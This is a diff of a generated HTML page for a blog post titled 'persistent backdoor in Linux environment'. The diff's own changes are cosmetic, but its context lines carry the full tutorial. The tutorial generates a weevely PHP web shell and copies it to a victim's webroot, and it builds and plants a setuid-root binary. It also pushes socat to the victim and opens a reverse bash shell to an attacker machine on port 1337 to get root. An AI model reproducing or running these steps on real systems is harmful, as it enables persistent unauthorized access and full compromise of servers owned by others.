@@ -10,10 +10,10 @@
 There are multiple methods available to create a persistent backdoor. Today I&rsquo;m going to explain how you can create a backdoor in webservers.
 Tools needed  socat weevely some common sense  Installing Tools weevely Install weevely if you don&rsquo;t have it." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://abdullah.today/persistent-backdoor-in-linux-environment/" />
-<meta property="og:image" content="https://abdullah.today/logo.png"/>
+<meta property="og:url" content="https://abdullah.today/persistent-backdoor-in-linux-environment/" /><meta property="og:image" content="https://abdullah.today/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-02-18T14:53:36+05:00" />
 <meta property="article:modified_time" content="2021-02-18T14:53:36+05:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://abdullah.today/logo.png"/>
 
@@ -24,7 +24,7 @@ Tools needed  socat weevely some common sense  Installing Tools weevely Install 
 <meta name="application-name" content="Abdullah Khabir">
 <meta name="apple-mobile-web-app-title" content="Abdullah Khabir"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://abdullah.today/persistent-backdoor-in-linux-environment/" /><link rel="prev" href="https://abdullah.today/things-to-do-after-new-openbsd-install/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://abdullah.today/persistent-backdoor-in-linux-environment/" /><link rel="prev" href="https://abdullah.today/things-to-do-after-new-openbsd-install/" /><link rel="next" href="https://abdullah.today/baqara/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -161,12 +161,12 @@ Today I&rsquo;m going to explain how you can create a backdoor in webservers.</p
 it.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/epinna/weevely3.git
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/epinna/weevely3.git
 <span class="nb">cd</span> weevely3
 pip3 install -r requirements.txt --upgrade
 </code></pre></td></tr></table>
@@ -174,21 +174,21 @@ pip3 install -r requirements.txt --upgrade
 </div><p>If you don&rsquo;t have RUST installed, you can install weevely as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">CRYPTOGRAPHY_DONT_BUILD_RUST</span><span class="o">=</span><span class="m">1</span> pip3 install -r requirements.txt --upgrade
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">CRYPTOGRAPHY_DONT_BUILD_RUST</span><span class="o">=</span><span class="m">1</span> pip3 install -r requirements.txt --upgrade
 </code></pre></td></tr></table>
 </div>
 </div><h4 id="socat">socat</h4>
 <p>Install socat for your OS. You can grab binaries from <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" target="_blank" rel="noopener noreffer">here</a>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /usr/bin/socat
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /usr/bin/socat
 chmod +x /usr/bin/socat
 </code></pre></td></tr></table>
 </div>
@@ -196,10 +196,10 @@ chmod +x /usr/bin/socat
 <p>With weevely we are going to create a backdoor.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">weevely generate backdoor.php some_password
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">weevely generate backdoor.php some_password
 </code></pre></td></tr></table>
 </div>
 </div><p>Replace some_password with some memorable password.</p>
@@ -207,11 +207,11 @@ chmod +x /usr/bin/socat
 with python.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> weevely3
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> weevely3
 python3 weevely.py generate backdoor.php some_password
 </code></pre></td></tr></table>
 </div>
@@ -220,20 +220,20 @@ python3 weevely.py generate backdoor.php some_password
 to webserver&rsquo;s root.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">scp backdoor.php 192.168.1.100:/var/www/html/backdoor.php
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">scp backdoor.php 192.168.1.100:/var/www/html/backdoor.php
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="executing-our-backdoor">Executing our backdoor</h3>
 <p>You can execute your backdoor with weevely like this:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">weevely http://192.168.1.100/backdoor.php some_password
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">weevely http://192.168.1.100/backdoor.php some_password
 </code></pre></td></tr></table>
 </div>
 </div><p>Replace some_password with the password you entered while creating this
@@ -247,7 +247,7 @@ Just type : and press TAB to get auto complete options.</p>
 <p>In your local machine, create a new file with these contents:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -255,7 +255,7 @@ Just type : and press TAB to get auto complete options.</p>
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">cat mysuid.c
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cat mysuid.c
 
 int main<span class="o">()</span> <span class="o">{</span>
     setresuid<span class="o">(</span>0,0,0<span class="o">)</span><span class="p">;</span>
@@ -266,12 +266,12 @@ int main<span class="o">()</span> <span class="o">{</span>
 </div><p>Compile it, change permissions and set suid.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gcc -o mysuid mysuid.c
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc -o mysuid mysuid.c
 chown root:root mysuid
 chmod u+s mysuid
 </code></pre></td></tr></table>
@@ -280,10 +280,10 @@ chmod u+s mysuid
 <p>Now push this executable to victim system as root.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">scp mysuid 192.168.1.100:/usr/bin/mysuid
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">scp mysuid 192.168.1.100:/usr/bin/mysuid
 </code></pre></td></tr></table>
 </div>
 </div><h4 id="push-socat-to-victim">Push socat to victim</h4>
@@ -291,20 +291,20 @@ chmod u+s mysuid
 binary from Github as stated above.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">scp /usr/bin/scoat 192.168.1.100:/usr/bin/socat
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">scp /usr/bin/scoat 192.168.1.100:/usr/bin/socat
 </code></pre></td></tr></table>
 </div>
 </div><p>Or in victim system run this:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /usr/bin/socat
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /usr/bin/socat
 chmod +x /usr/bin/socat
 </code></pre></td></tr></table>
 </div>
@@ -312,28 +312,28 @@ chmod +x /usr/bin/socat
 <p>On your local machine, run:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> TCP-L:1337
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> TCP-L:1337
 </code></pre></td></tr></table>
 </div>
 </div><p>Using weevely get a non-privileged shell. And run this:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/socat exec:<span class="s1">&#39;/bin/bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:YOUR_ATTACK_MACHINE_IP:1337
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/socat exec:<span class="s1">&#39;/bin/bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:YOUR_ATTACK_MACHINE_IP:1337
 </code></pre></td></tr></table>
 </div>
 </div><p>You will get a shell. Now execute mysuid we copied earlier.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/mysuid
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/mysuid
 </code></pre></td></tr></table>
 </div>
 </div><p>You will get a root shell.</p>
@@ -361,7 +361,8 @@ chmod +x /usr/bin/socat
         </section>
     </div>
 
-    <div class="post-nav"><a href="/things-to-do-after-new-openbsd-install/" class="prev" rel="prev" title="Things to Do After New OpenBSD Install"><i class="fas fa-angle-left fa-fw"></i>Things to Do After New OpenBSD Install</a></div>
+    <div class="post-nav"><a href="/things-to-do-after-new-openbsd-install/" class="prev" rel="prev" title="Things to Do After New OpenBSD Install"><i class="fas fa-angle-left fa-fw"></i>Things to Do After New OpenBSD Install</a>
+            <a href="/baqara/" class="next" rel="next" title="Baqara">Baqara<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 <div id="comments"><div id="fb-root" class="comment"></div>
             <div
